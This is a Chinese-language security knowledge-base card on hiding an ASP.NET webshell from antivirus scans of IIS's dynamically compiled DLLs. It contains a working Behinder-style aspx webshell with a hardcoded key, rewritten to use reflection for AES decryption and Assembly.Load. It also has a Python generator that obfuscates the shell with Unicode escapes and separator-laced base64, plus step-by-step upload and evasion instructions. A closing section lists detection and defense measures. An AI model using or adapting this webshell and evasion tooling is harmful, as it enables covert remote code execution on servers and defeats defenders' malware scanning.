---
id: web-dotnet-aspnet-webshell-compiled-assembly-evasion
title: ASP.NET WebShell 编译产物免杀：反射调用 RijndaelManaged/Assembly.Load + 变异 base64 字符串，绕过对 Temporary ASP.NET Files 动态编译 DLL 的查杀
type: scenario
domain: web
path: web/dotnet
technique: aspnet-webshell-compiled-assembly-reflection-string-evasion
tags:
- web
- dotnet
- aspnet
- iis
- webshell
- av-evasion
- reflection
- base64
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V283
  verified_at: '2026-11-08T05:11:55+08:00'
  notes: 已对照原文与全部 3 张图核对：img/01 为 Temporary ASP.NET Files\...\App_Web_index.aspx.cdcab7d2.cs03eaq9.dll 的 System.IO.FileLoadException『拒绝访问』；img/02 dnspy 中原始 __Render_control 的 Session.Add/Assembly.Load/RijndaelManaged；img/03 为最终 Unicode+变异 base64+反射版本。卡内两处 VT 数字（15→7 检出）、无效变换清单、反射改写代码、base64 分隔符生成器、Session key e45e329feb5d925b 均与原文一致。原文未标 ASP.NET 版本，未设置 versions。未上传/运行 webshell，未复跑生成器。
url: /docs/web/dotnet/web-dotnet-aspnet-webshell-compiled-assembly-evasion/
draft: false
kb_aliases:
- ASP.NET webshell 免杀
- 冰蝎 aspx 编译产物免杀
- Temporary ASP.NET Files 查杀
- 反射调用 Assembly.Load
- 变异 base64 字符串免杀
- aspx unicode 编码免杀
---

## 一句话结论

ASP.NET 的 aspx 源文件可以用 Unicode 编码躲过文件查杀，但 IIS 首次访问时会把它动态编译成 `Temporary ASP.NET Files` 下的 DLL，杀软查的是这个编译产物里的敏感方法调用（`RijndaelManaged`、`Assembly.Load`）与字符串常量，导致 webshell 加载失败；把敏感调用改成 `Type.GetType` + `Activator.CreateInstance` + `GetMethod/Invoke` 反射，并把字符串常量替换成运行时解码的变异 base64，编译产物的检出从 15 个引擎降到 7 个，webshell 可以正常连接。

## 原理

- **两处查杀面**：ASP.NET 页面在首次请求时由 `System.Web.Compilation` 动态编译为程序集，落在 `%LOCALAPPDATA%\Temp\Temporary ASP.NET Files\...\App_Web_*.dll`（原文报错路径即为该目录）。源文件（aspx）与编译产物（DLL）是两份独立文件，杀软可以分别查杀；当源文件通过 Unicode 等混淆未被杀、但编译产物被拦时，页面会抛 `System.IO.FileLoadException`/「未能加载文件或程序集…拒绝访问」，webshell 无法使用。
- **源文件混淆对编译产物无效**：Unicode 编码、空字符串连接、`<% %>` 截断、头部替换、`@` 特殊符号、注释、字符串常量拼接等只改变源文本；编译器会把常量折叠、把标识符还原，最终 DLL 的 IL 与元数据仍是同样的敏感调用和字符串。原文逐项测试确认这些变换对编译产物没有影响。
- **查杀特征**：杀软主要命中两类——敏感方法调用（AES 解密 `System.Security.Cryptography.RijndaelManaged`、内存加载程序集 `System.Reflection.Assembly.Load`）与字符串常量（类型名、方法名、载荷类名）。
- **反射为什么能减少特征**：原始代码在 IL 中直接 `newobj RijndaelManaged`、`call Assembly.Load`；改成 `Type.GetType("...")` 取类型、`GetMethod("CreateDecryptor")`/`GetMethod("Load")` 取方法、`Invoke` 调用后，IL 中不再出现对敏感方法的直接调用指令，敏感信息退化为字符串参数，静态规则更难命中。
- **字符串变异为什么能减少特征**：把 `"Load"` 等常量替换为 `System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("T(G(9(h(Z(A(=(=".Replace("(","")))`——base64 中插入随机分隔符（原文生成器从 `!@#$%^&*(){}:<>?.,;[]-|` 中随机选一个），运行时先 `Replace` 去掉再解码。DLL 里不存在明文类型名/方法名，字符串扫描规则失效。
- **不是完全免杀**：原文 VirusTotal 从 15 个检出降到 7 个，说明仍有引擎可查；反射+字符串编码只是降低静态特征，行为/内存/流量检测仍可能发现。

## 触发条件

- 目标为 ASP.NET/IIS，webshell 为依赖 `Assembly.Load` 的加密马（如冰蝎 aspx），源文件已上传且可访问。
- 服务器上的杀软会扫描 `Temporary ASP.NET Files` 下的动态编译 DLL（原文为卡巴斯基等），直接上传原始 aspx 时编译产物被拦。
- .NET Framework 支持 `RijndaelManaged`、`Type.GetType`、`Activator`、反射 `Invoke`（默认支持）。
- 攻击者能在上传前改写 webshell 源码（或使用生成器批量生成）。

## 利用步骤

1. 上传原始冰蝎 aspx 并访问，若返回「未能加载文件或程序集 `...Temporary ASP.NET Files...App_Web_*.dll` 或它的某一个依赖项。拒绝访问」，说明源文件没被杀但编译产物被拦。
2. 把 AES 解密与程序集加载改为反射：
   - `Type t1 = Type.GetType("System.Security.Cryptography.RijndaelManaged"); object aes = Activator.CreateInstance(t1);`
   - `var decryptor = t1.GetMethod("CreateDecryptor", new Type[]{typeof(byte[]), typeof(byte[])}); var transform = decryptor.Invoke(aes, new object[]{k,k});`
   - `Type t2 = Type.GetType("System.Reflection.Assembly"); var load = t2.GetMethod("Load", new Type[]{typeof(byte[])}); var assembly = load.Invoke(null, new object[]{data});`
   - `t2.GetMethod("CreateInstance", new Type[]{typeof(string)}).Invoke(assembly, new object[]{"U"}).Equals(this);`
3. 把类型名、方法名、类名等字符串常量替换为变异 base64 运行时解码（见 PoC 的生成器）；解码表达式本身也参与 Unicode 混淆。
4. 保留 aspx 源文件的 Unicode 编码（把标识符转成 `\uXXXX`）以通过源文件层查杀；注意这对编译产物无效，只是第一层。
5. 上传访问，确认 webshell 客户端可连接；如需进一步降低检出，再结合其他免杀/内存马手法。

## PoC

核心反射改写（冰蝎 aspx，Session key 按客户端配置）：

```aspx
<%@ Page Language="C#" %>
<%
    Session.Add("k","e45e329feb5d925b");
    byte[] k = Encoding.Default.GetBytes(Session[0] + ""), c = Request.BinaryRead(Request.ContentLength);
    Type t1 = Type.GetType("System.Security.Cryptography.RijndaelManaged");
    object aes = Activator.CreateInstance(t1);
    var decryptor = t1.GetMethod("CreateDecryptor", new Type[] { typeof(byte[]), typeof(byte[]) });
    var transform = decryptor.Invoke(aes, new object[] { k, k });
    byte[] data = ((System.Security.Cryptography.ICryptoTransform)transform).TransformFinalBlock(c, 0, c.Length);
    Type t2 = Type.GetType("System.Reflection.Assembly");
    var load = t2.GetMethod("Load", new Type[] { typeof(byte[]) });
    var assembly = load.Invoke(null, new object[] { data });
    t2.GetMethod("CreateInstance", new Type[] { typeof(string) }).Invoke(assembly, new object[] { "U" }).Equals(this);
%>
```

字符串常量变异示例（`"Load"` 的 base64 `TG9hZA==` 插入分隔符 `(` 后运行时还原）：

```csharp
System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("T(G(9(h(Z(A(=(=".Replace("(","")))
```

自动生成器（把敏感标识符 Unicode 化，把字符串常量转成随机分隔符的 base64 解码表达式）：

```python
import re, base64, random

BEHINDER = '''
Session.Add("k", "e45e329feb5d925b");
byte[] k = Encoding.Default.GetBytes(Session[0] + "");
byte[] c = Request.BinaryRead(Request.ContentLength);
Type t1 = Type.GetType("System.Security.Cryptography.RijndaelManaged");
Type t2 = Type.GetType("System.Reflection.Assembly");
t2.GetMethod("CreateInstance", new Type[] { typeof(string) }).Invoke(t2.GetMethod("Load", new Type[] { typeof(byte[]) }).Invoke(null, new object[] { ((System.Security.Cryptography.ICryptoTransform)t1.GetMethod("CreateDecryptor", new Type[] { typeof(byte[]), typeof(byte[]) }).Invoke(Activator.CreateInstance(t1), new object[] { k, k })).TransformFinalBlock(c, 0, c.Length) }), new object[] { "U" }).Equals(this);
'''

def replunicode(m):
    old = m.group(1)
    new = "".join([f'\\u{ord(c):04x}' for c in old])
    return m.group(0).replace(old, new)

def unicode(cs):
    return re.sub(r'[^"]\b([A-Z]\w+)\b', replunicode, cs)

def replstr(m):
    old = m.group(0)
    if len(old) == 2:
        return old
    old = old[1:-1]
    b64str = base64.b64encode(old.encode('utf-8')).decode('ascii')
    pad = random.choice("!@#$%^&*(){}:<>?.,;[]-|")
    new = pad.join(list(b64str))
    return f'System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("{new}".Replace("{pad}","")))'

def rstr(cs):
    return re.sub(r'".*?"', replstr, cs)

src = unicode(rstr(BEHINDER)).replace('\n','')
print(f'<%@ Page Language="C#"%><%{src}%>')
```

## 变体与关联

- 变体：只做反射改写、不编码字符串，或反过来；两者叠加效果最好（原文最终产物两者都做）。
- 变体：字符串编码换成字符码算术/异或/`char[]` 拼接、`AppDomain.CurrentDomain.Load` 代替 `Assembly.Load`，或 `MethodInfo.Invoke` 换成委托/`DynamicMethod`；目标都是让敏感常量/调用不落明文。
- 变体：把 webshell 改成内存马/编译缓存注入，避免每次请求触发动态编译落盘（见关联卡）。
- 关联：[[web-dotnet-csharpcodeprovider-asmx-memshell-cache-injection]]（ASP.NET 内存马与 BuildManager 缓存注入，可避开磁盘编译产物查杀）。
- 关联：[[web-dotnet-deserialization]] 下的 .NET 反序列化卡（同为 .NET 程序集加载/反射执行面）。
- 边界：反射仍会在运行时加载敏感类型；若 EDR 做 API/内存监控，可能与静态免杀无关地告警。源文件 Unicode 混淆只对文本查杀有效，对编译产物无效。

## 检测与防御

- 检测：监控 `Temporary ASP.NET Files` 下新增/变更的 `App_Web_*.dll`，对编译产物做静态扫描（不要只扫 aspx 源文件）；对比源文件与编译 DLL 的特征差异。
- 检测：IL/元数据中出现 `Type.GetType` + `GetMethod` + `Invoke` 组合、`Convert.FromBase64String` + `Replace` 的高频字符串解码、Unicode 转义的 aspx 源文件；Web 目录新增 aspx/ashx/asmx 与访问日志中的异常首次请求。
- 检测：w3wp.exe 加载未签名/临时目录程序集；webshell 客户端的加密请求特征（固定 Session key、二进制 body、非常规 UA）。
- 防御：Web 根目录只读、禁止上传可执行脚本；IIS 关闭不必要的动态编译/使用预编译站点；应用池最小权限；对 `Temporary ASP.NET Files` 做 ACL 与完整性监控。
- 防御：启用 AMSI（.NET 反恶意软件扫描接口）与 EDR 内存/行为检测；对反射加载与程序集加载做审计；定期清理临时编译目录并排查异常 aspx。
